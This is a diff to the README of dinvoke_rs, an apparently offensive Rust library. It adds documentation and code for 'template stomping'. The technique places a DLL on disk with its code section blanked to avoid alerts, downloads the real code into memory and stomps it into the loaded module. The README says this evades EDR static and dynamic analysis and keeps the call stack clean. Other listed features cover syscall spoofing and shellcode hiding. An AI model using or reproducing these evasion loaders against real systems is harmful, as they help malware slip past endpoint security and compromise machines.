@@ -12,6 +12,7 @@ Features:
 * Module fluctuation to hide mapped PEs (concurrency supported). **Not Opsec**
 * Syscall parameters spoofing through exception filter + hardware breakpoints. **x64 only**
 * Module stomping and shellcode fluctuation.
+* Template stomping.
 
 # Credit
 All the credits go to the creators of the original C# implementation of this tool:
@@ -29,6 +30,7 @@ All the credits go to the creators of the original C# implementation of this too
 - [Module fluctuation](#Module-fluctuation)
 - [Use hardware breakpoints to spoof syscall parameters](#Syscall-parameters-spoofing)
 - [Module stomping and Shellcode fluctuation](#Module-stomping-and-Shellcode-fluctuation)
+- [Template stomping](#Template-stomping)
 
 # Usage
 
@@ -385,3 +387,43 @@ let run: unsafe extern "system" fn () = std::mem::transmute(overload.1);
 run();
 let _r = manager.hide_shellcode(overload.1).unwrap(); // We hide the shellcode again
 ```
+
+## Template stomping
+Template stomping is a derivative of the module stomping technique tailored specifically for DLLs. Right now this technique only allows to load a DLL into the current process, remote processes are not supported.
+
+The main objective is to create a template from a DLL by replacing the content of the `.text` section with arbitrary data, allowing to write the template on disk without raising alerts; this DLL is crafted in a way that it can be loaded into the process by calling `LoadLibrary`. Then, the original `.text` section content can be downloaded directly to the process' memory and stomped on the template's corresponding memory region. This technique can be effectively executed using two main functions: `generate_template` and `template_stomping`.
+
+The `generate_template` function is designed to create the template from the original DLL by extracting the `.text` section content  and replacing it with arbitrary data. This ensures that the template maintains its structure but contains no meaningful executable code, apart from the entry points and TLS callbacks, which are replaced with dummy but functional assembly instructions. The original `.text` section content is saved separately in `payload.bin`, and the final template file is saved in `template.dll`.
+
+```rust
+fn main ()
+{
+    let template = dinvoke_rs::overload::generate_template(r"C:\Path\To\payload.dll", r"C:\Path\To\Output\Directory\");
+    match template
+    {
+        Ok(()) => { println!("Template successfully generated.");}
+        Err(x) => { println!("Error ocurred: {x}");}
+    }
+}
+```
+
+Then the template can be saved on disk on the target system and can be loaded with `LoadLibrary`. Once the template has been loaded into memory, the next step involves stomping the original executable content stored in `payload.bin` into the `.text` section of the template. This process is performed by the `template_stomping` function, which stomps the original executable content into the right memory region taking care of all the details involved in the process.
+
+```rust
+
+fn main ()
+{  
+    unsafe
+    {
+        let mut payload = http_download_payload(); // Download payload.bin content directly to memory
+        let stomped_dll = overload::template_stomping(r"C:\Path\To\template.dll", &mut payload).unwrap();
+        println!("Stomped DLL base address: 0x{:x}", stomped_dll.1);
+
+        let function_ptr = dinvoke::get_function_address(stomped_dll.1, "SomeRandomFunction");
+        let function: extern "system" fn() = std::mem::transmute(function_ptr);
+        function();
+    }
+}
+```
+
+This technique allows to load the DLL into disk backed memory regions without writing the real executable content to the filesystem (removing the need of private memory regions and evading EDR's static/dynamic analysis) and also allows to keep a clean call stack during the execution of the DLL's code, unlike what happens when we load a DLL reflectively.
